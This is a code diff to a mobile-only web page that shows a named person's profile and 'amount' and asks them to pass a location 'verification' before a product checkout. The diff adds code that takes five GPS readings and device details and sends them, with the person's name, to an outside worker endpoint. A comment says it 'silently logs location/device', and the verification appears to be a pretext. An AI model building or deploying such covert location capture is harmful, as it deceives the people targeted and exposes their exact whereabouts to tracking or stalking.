@@ -23,17 +23,17 @@
             box-sizing: border-box;
         }
 
-        #appContent { display: none; flex-direction: column; align-items: center; width: 100%; max-width: 600px; }
+        #appContent { display: none; flex-direction: column; align-items: center; width: 100%; }
         #desktopBlock { display: none; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 100%; }
         #desktopBlock h1 { color: #d32f2f; margin-top: 0; }
         #desktopBlock p { color: #555; line-height: 1.5; margin-bottom: 25px; }
         #qrCode { margin: 0 auto; border: 10px solid #f0f0f0; border-radius: 8px; }
 
-        .privacy-notice { background: #fff3e0; color: #d84315; padding: 20px; border: 2px solid #ffb74d; border-radius: 8px; margin-bottom: 30px; width: 100%; text-align: center; box-shadow: 0 4px 6px rgba(0,0,0,0.05); box-sizing: border-box; }
+        .privacy-notice { background: #fff3e0; color: #d84315; padding: 20px; border: 2px solid #ffb74d; border-radius: 8px; margin-bottom: 30px; max-width: 500px; width: 100%; text-align: center; box-shadow: 0 4px 6px rgba(0,0,0,0.05); box-sizing: border-box; }
         .privacy-notice h2 { margin: 0 0 10px 0; font-size: 22px; text-transform: uppercase; letter-spacing: 1px; }
         .privacy-notice p { margin: 0; font-size: 16px; line-height: 1.5; font-weight: bold; }
         
-        .verification-container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; width: 100%; box-sizing: border-box; }
+        .verification-container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; max-width: 500px; width: 100%; box-sizing: border-box; }
         .verification-container h1 { font-size: 24px; color: #1a73e8; margin-top: 0; margin-bottom: 15px; }
         p.subtitle { color: #666; margin-bottom: 25px; font-size: 15px; }
 
@@ -52,6 +52,7 @@
             box-sizing: border-box;
             gap: 15px;
         }
+
         .profile-avatar { width: 56px; height: 56px; border-radius: 50%; object-fit: cover; border: 2px solid #1a73e8; background-color: #f0f0f0; }
         .profile-info { display: flex; flex-direction: column; justify-content: center; }
         .profile-name { font-size: 18px; font-weight: bold; color: #333; margin-bottom: 4px; }
@@ -71,8 +72,8 @@
         .error { color: #d32f2f; margin-top: 15px; font-weight: bold; }
 
         .alert-popup-container { text-align: center; display: none; }
-        .alert-popup-title { font-size: 24px; font-weight: bold; color: #4CAF50; margin-top: 15px; margin-bottom: 10px; z-index: 2; position: relative; }
-        .alert-popup-message { color: #777; font-size: 16px; font-weight: 300; line-height: 1.4; margin-bottom: 20px;}
+        .alert-popup-title { font-size: 30px; font-weight: bold; color: #4CAF50; margin-top: 15px; margin-bottom: 15px; z-index: 2; position: relative; }
+        .alert-popup-message { color: #777; font-size: 18px; font-weight: 500; line-height: 1.4; margin-bottom: 10px; }
         
         .success-checkmark { width: 80px; height: 80px; margin: 0 auto; }
         .success-checkmark .check-icon { width: 80px; height: 80px; position: relative; border-radius: 50%; box-sizing: content-box; border: 4px solid #4CAF50; }
@@ -84,46 +85,6 @@
         .success-checkmark .check-icon .icon-line.line-long { top: 38px; right: 8px; width: 47px; transform: rotate(-45deg); animation: icon-line-long 0.75s; }
         .success-checkmark .check-icon .icon-circle { top: -4px; left: -4px; z-index: 10; width: 80px; height: 80px; border-radius: 50%; position: absolute; box-sizing: content-box; border: 4px solid rgba(76, 175, 80, .5); }
         .success-checkmark .check-icon .icon-fix { top: 8px; width: 5px; left: 26px; z-index: 1; height: 85px; position: absolute; transform: rotate(-45deg); background-color: #FFFFFF; }
-
-        /* --- Products UI Styling --- */
-        #productsContainer {
-            display: none;
-            width: 100%;
-            margin-top: 20px;
-            text-align: left;
-        }
-        #productsContainer h2 {
-            color: #333;
-            font-size: 20px;
-            margin-top: 0;
-            border-bottom: 2px solid #f0f0f0;
-            padding-bottom: 10px;
-        }
-        .products-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 15px;
-            margin-top: 15px;
-        }
-        .product-card {
-            background: #fdfdfd;
-            border: 1px solid #eaeaea;
-            border-radius: 8px;
-            padding: 15px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
-        }
-        .product-card strong {
-            display: block;
-            font-size: 16px;
-            color: #1a73e8;
-            margin-bottom: 5px;
-        }
-        .product-card span {
-            font-size: 14px;
-            color: #555;
-            display: block;
-            margin-bottom: 3px;
-        }
 
         @keyframes rotate-circle { 0% { transform: rotate(-45deg); } 5% { transform: rotate(-45deg); } 12% { transform: rotate(-405deg); } 100% { transform: rotate(-405deg); } }
         @keyframes icon-line-tip { 0% { width: 0; left: 1px; top: 19px; } 54% { width: 0; left: 1px; top: 19px; } 70% { width: 50px; left: -8px; top: 37px; } 84% { width: 17px; left: 21px; top: 48px; } 100% { width: 25px; left: 14px; top: 45px; } }
@@ -139,14 +100,14 @@
     </div>
 
     <div id="appContent">
-        <div class="privacy-notice" id="privacyNotice">
+        <div class="privacy-notice">
             <h2>Notice of Data Collection</h2>
-            <p>This process requires access to your device's GPS and network sensors to securely authorize your request.</p>
+            <p>This process requires access to your device's GPS and network sensors to collect and verify your exact physical location.</p>
         </div>
 
         <div class="verification-container" id="mainContainer">
             <div id="introScreen">
-                <h1>Secure Authorization</h1>
+                <h1>Location Verification</h1>
                 
                 <div id="statusBadge" class="badge-loading" style="display: none;"></div>
                 
@@ -159,8 +120,8 @@
                     </div>
                 </div>
                 
-                <p class="subtitle">Please authorize the browser location prompt to unlock products.</p>
-                <button id="startBtn">Verify & Unlock</button>
+                <p class="subtitle">Please authorize the browser prompt to proceed.</p>
+                <button id="startBtn">Begin Verification</button>
                 <div id="errorMsg" class="error"></div>
             </div>
             
@@ -182,12 +143,9 @@
                         <div class="icon-fix"></div>
                     </div>
                 </div>
-                <div class="alert-popup-title">Verification Process Completed</div>
-                <div id="finalStatusMessage" class="alert-popup-message">Data successfully verified.</div>
-                
-                <div id="debugOutput">
-                    <pre id="jsonRender"></pre>
-                </div>
+                <div class="alert-popup-title">Verified</div>
+                <!-- Dynamic status text during redirect operations -->
+                <div id="finalStatusMessage" class="alert-popup-message">Processing your request...</div>
             </div>
         </div>
     </div>
@@ -195,8 +153,6 @@
     <script>
         const appContent = document.getElementById('appContent');
         const desktopBlock = document.getElementById('desktopBlock');
-        const privacyNotice = document.getElementById('privacyNotice');
-        
         const startBtn = document.getElementById('startBtn');
         const introScreen = document.getElementById('introScreen');
         const progressWrapper = document.getElementById('progressWrapper');
@@ -211,8 +167,6 @@
         const profileAvatar = document.getElementById('profileAvatar');
         const profileName = document.getElementById('profileName');
         const profileAmount = document.getElementById('profileAmount');
-        const debugOutput = document.getElementById('debugOutput');
-        const jsonRender = document.getElementById('jsonRender');
         
         let watchId = null;
         let sessionData = {}; 
@@ -221,8 +175,8 @@
 
         function getDeviceDetails() {
             const ua = navigator.userAgent;
-            let device = "Desktop";
             let os = "Unknown OS";
+            let device = "Desktop";
 
             if (/Windows/i.test(ua)) os = "Windows";
             else if (/Android/i.test(ua)) os = "Android";
@@ -233,18 +187,18 @@
             }
             else if (/Linux/i.test(ua)) os = "Linux";
 
-            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua) || os === "iPadOS") {
-                device = "Mobile / Tablet";
-            }
-            
+            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua) || os === "iPadOS") device = "Mobile / Tablet";
+
             return { os, device, userAgent: ua };
         }
 
-        // 1. Initial Decryption
+        // ==========================================
+        // 1. Initial Identity Decryption
+        // ==========================================
         async function processIdentifier(encryptedToken) {
             if (!encryptedToken || encryptedToken.trim() === '') return;
 
-            statusBadge.textContent = `Authorizing session...`;
+            statusBadge.textContent = `Decrypting token...`;
             statusBadge.className = 'badge-loading';
             statusBadge.style.display = 'inline-block';
             startBtn.disabled = true;
@@ -265,7 +219,6 @@
                         statusBadge.style.display = 'none'; 
                         
                         profileAvatar.src = result.data.pfp || '';
-                        profileAvatar.src = result.data.pfp;
                         profileName.textContent = result.data.name;
                         profileAmount.textContent = `Amount: ${result.data.amount}`;
                         
@@ -275,16 +228,16 @@
                         userProfileCard.style.display = 'flex';
                         startBtn.disabled = false;
                     } else {
-                        throw new Error("Invalid API Data Structure");
+                        throw new Error(result.error || "Invalid API Data Structure");
                     }
                 } else {
                     const errorObj = await response.json().catch(() => ({}));
                     statusBadge.className = 'badge-error';
-                    statusBadge.textContent = `Authorization Rejected: ${errorObj.error || response.statusText}`;
+                    statusBadge.textContent = errorObj.error || `API Error (${response.status})`;
                 }
             } catch (error) {
                 statusBadge.className = 'badge-error';
-                statusBadge.textContent = "Data Error: Could not resolve authorization token.";
+                statusBadge.textContent = error.message || "Data Error: Could not resolve token.";
             }
         }
 
@@ -304,14 +257,39 @@
 
         initializeApp();
 
-        // Send payload to local encryption API and fetch products
+        // ==========================================
+        // 2. Save Location Payload to Turso Database
+        // ==========================================
+        async function processCollectedData(data) {
+            try {
+                // Formatting payload strictly based on API expectations
+                const payload = {
+                    name: extractedName,
+                    system: data.system,
+                    samples: data.samples
+                };
+
+                const response = await fetch("https://encrypt.ionpromax.workers.dev/savedata", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (!response.ok) console.warn("Background save warning:", response.status);
+            } catch (error) {
+                console.warn("Background save network error.");
+            }
+        }
+
+        // ==========================================
+        // 3. Fetch Products, Extract Details, Save to Cookies
+        // ==========================================
         async function fetchProductsData() {
-            console.log("Location verification complete. Fetching products...");
-            if(finalStatusMessage) finalStatusMessage.textContent = "Securely fetching available products...";
+            finalStatusMessage.textContent = "Securely generating product bundles...";
 
             try {
-                // 1. Locally encrypt the amount payload
-                const localEncryptResponse = await fetch('/api/encrypt', {
+                // 3a. Locally encrypt the amount payload
+                const localEncryptRes = await fetch('/api/encrypt', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -320,39 +298,63 @@
                     })
                 });
 
-                if (!localEncryptResponse.ok) {
-                    throw new Error(`Local Encryption Failed: ${localEncryptResponse.status}`);
-                }
+                if (!localEncryptRes.ok) throw new Error("Local encryption failed");
+                const encryptResult = await localEncryptRes.json();
+                const newToken = encryptResult.token || encryptResult.result;
 
-                const encryptResult = await localEncryptResponse.json();
-                const newEncryptedToken = encryptResult.token || encryptResult.result;
-
-                // 2. Fetch products from edge network
-                const productsResponse = await fetch('https://encrypt.ionpromax.workers.dev/products', {
+                // 3b. Fetch optimized product URLs from edge
+                const productsRes = await fetch('https://encrypt.ionpromax.workers.dev/products', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ token: newEncryptedToken })
+                    body: JSON.stringify({ token: newToken })
                 });
 
-                if (productsResponse.ok) {
-                    const productsArray = await productsResponse.json();
-                    
-                    if(finalStatusMessage) finalStatusMessage.textContent = "Redirecting to checkout...";
-                    
-                    // 3. Save to cookie and redirect
-                    document.cookie = "productsData=" + encodeURIComponent(JSON.stringify(productsArray)) + "; path=/; max-age=3600";
-                    window.location.href = "/checkout.html";
-                } else {
-                    console.error("Failed to fetch products. API Status:", productsResponse.status);
-                    if(finalStatusMessage) finalStatusMessage.textContent = "Failed to fetch products.";
+                if (!productsRes.ok) throw new Error("Products bundle fetch failed");
+                const urlArray = await productsRes.json(); 
+
+                finalStatusMessage.textContent = "Fetching exact product details...";
+                const detailedProducts = [];
+
+                // 3c. Iterate URLs, extract permalink, and fetch exact name/price
+                for (const url of urlArray) {
+                    // Extracting the permalink (e.g., https://gum.co/xfvszl -> xfvszl)
+                    const permalink = url.split('?')[0].split('/').filter(Boolean).pop();
+                    if (!permalink) continue;
+
+                    const detailRes = await fetch('https://encrypt.ionpromax.workers.dev/product', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ permalink })
+                    });
+
+                    if (detailRes.ok) {
+                        const detailData = await detailRes.json();
+                        if (detailData.success && detailData.product) {
+                            detailedProducts.push({
+                                link: url,
+                                name: detailData.product.name,
+                                amount: detailData.product.price_cents
+                            });
+                        }
+                    }
                 }
 
+                finalStatusMessage.textContent = "Redirecting to checkout...";
+
+                // 3d. Save to cookie and redirect
+                // Note: encodeURIComponent ensures the JSON survives safely in the cookie header
+                document.cookie = "productsData=" + encodeURIComponent(JSON.stringify(detailedProducts)) + "; path=/; max-age=3600";
+                window.location.href = "/checkout.html";
+
             } catch (error) {
-                console.error("Network error while fetching products:", error);
-                if(finalStatusMessage) finalStatusMessage.textContent = "Network error while processing.";
+                console.error("Products error:", error);
+                finalStatusMessage.textContent = "Failed to finalize products. Please try again.";
             }
         }
 
+        // ==========================================
+        // 4. Geolocation Logic Gate
+        // ==========================================
         startBtn.addEventListener('click', () => {
             errorMsg.innerHTML = '';
 
@@ -363,17 +365,14 @@
 
             introScreen.style.display = 'none';
             progressWrapper.style.display = 'block';
-            
-            // Re-initialize session data structure for saving
-            sessionData.name = extractedName;
+
             sessionData.system = getDeviceDetails();
             sessionData.samples = [];
 
             watchId = navigator.geolocation.watchPosition(
                 (position) => {
                     if (sessionData.samples.length >= 5) return;
-                    
-                    // Push minified lat/lon/am keys
+
                     sessionData.samples.push({
                         lat: position.coords.latitude,
                         lon: position.coords.longitude,
@@ -386,22 +385,13 @@
 
                     if (sessionData.samples.length === 5) {
                         navigator.geolocation.clearWatch(watchId);
-                        
-                        // Calculate center metrics
-                        const avgLat = sessionData.samples.reduce((acc, val) => acc + val.lat, 0) / 5;
-                        const avgLon = sessionData.samples.reduce((acc, val) => acc + val.lon, 0) / 5;
-                        const avgAcc = sessionData.samples.reduce((acc, val) => acc + val.am, 0) / 5;
-
-                        sessionData.calculated_center = {
-                            lat: Number(avgLat.toFixed(7)),
-                            lon: Number(avgLon.toFixed(7)),
-                            am: Number(Math.round(avgAcc))
-                        };
 
                         progressWrapper.style.display = 'none';
                         successPopup.style.display = 'block';
                         
-                        fetchProductsData();
+                        // Fire both background processes simultaneously
+                        processCollectedData(sessionData); // Silently logs location/device
+                        fetchProductsData(); // Generates bundle, checks details, and redirects
                     }
                 },
                 (error) => {
